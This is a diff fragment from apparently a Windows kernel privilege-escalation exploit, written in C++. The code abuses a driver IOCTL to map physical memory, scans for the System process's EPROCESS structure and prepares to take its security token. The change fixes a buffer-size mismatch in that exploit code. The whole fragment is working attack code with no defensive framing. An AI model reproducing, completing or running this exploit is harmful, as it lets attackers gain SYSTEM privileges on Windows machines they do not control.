@@ -63,12 +63,13 @@ int main(int argc, char** argv)
 	}
 	printf("[+] Called IOCTL_MapPhysicalMemoryToLinearSpace successfully. 0x%X\n", IOCTL_MapPhysicalMemoryToLinearSpace);
 	printf("[+] Handle to PhysicalMemory: 0x%p\n", hPhysicalMemory);
-	PVOID* buf = (PVOID*)malloc(0x1000);
+	unsigned int bufSize = 0x4000;
+	PVOID* buf = (PVOID*)malloc(bufSize);
 	if (buf == 0) {
 		exit(EXIT_FAILURE);
 	}
 	
-	std::vector <unsigned __int64> EPROCESS_SYSTEM;
+	std::vector <unsigned __int64> EPROCESS_SYSTEM(0);
 
 	// do some sanity checks with GetEPROCESSPhysicalBase() as there may be some false positives...
 	if (GetEPROCESSPhysicalBase("System", 4, hPhysicalMemory, EPROCESS_SYSTEM) == -1)
@@ -86,7 +87,7 @@ int main(int argc, char** argv)
 	unsigned __int64 systemToken = 0;
 
 	for (int i = 0; i < EPROCESS_SYSTEM.size(); i++) {
-		if (MapPhysicalMemory(hPhysicalMemory, EPROCESS_SYSTEM_page[i], 0x4000, buf) == FALSE) {
+		if (MapPhysicalMemory(hPhysicalMemory, EPROCESS_SYSTEM_page[i], bufSize, buf) == FALSE) {
 			fprintf(stderr, "[!] MapPhysicalMemory failed\n");
 			return -1;
 		}
